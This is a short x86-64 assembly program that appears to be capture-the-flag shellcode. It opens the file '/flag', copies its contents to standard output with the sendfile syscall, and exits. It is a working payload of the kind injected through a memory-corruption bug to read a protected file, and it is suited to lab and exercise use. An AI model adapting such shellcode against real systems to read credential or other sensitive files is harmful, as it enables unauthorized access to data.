        .intel_syntax noprefix
        .global _start
        .text

_start:
open:
	// open 
	mov rax,2
	//const char __user * filename
	push offset in
	pop rdi
	// int flags
	xor rsi, rsi
	// umode_t mode
	xor rdx, rdx
	syscall
	push rax

sendfile:
        // size_t count
	mov	r10, 1024
	// loff_t__user * offset
	xor 	rdx, rdx
	// int in_fd
	pop 	rsi
	// int out_fd
	mov 	rdi, 1

	mov	rax, 40
        syscall

exit:	//exit
	mov 	rax, 60
	xor	rdi, rdi
	syscall
in: .ascii "/flag"
